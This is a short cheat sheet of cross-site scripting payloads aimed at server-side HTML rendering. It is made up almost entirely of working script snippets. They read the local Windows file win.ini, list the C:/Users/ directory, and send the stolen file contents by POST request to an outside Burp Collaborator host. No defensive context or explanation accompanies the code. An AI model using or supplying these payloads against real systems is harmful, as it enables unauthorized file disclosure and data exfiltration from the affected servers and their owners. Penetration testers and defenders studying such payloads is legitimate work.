Simple file reading via backend XSS:

<html><script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///C:/Windows/win.ini"); x.send(); </script></html>

Catalogs listing:

<script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///C:/Users/"); x.send(); </script>

Sending files to the collaborator:

<script>x=new XMLHttpRequest;x.onload=function(){a=new XMLHttpRequest;a.open("POST","http://randomcollaborator.burpcollaborator.net",true);a.setRequestHeader("Content-type", "application/x-www-form-urlencoded");a.send(this.responseText);};x.open("GET","file:///C:/Windows/win.ini");x.send();</script>

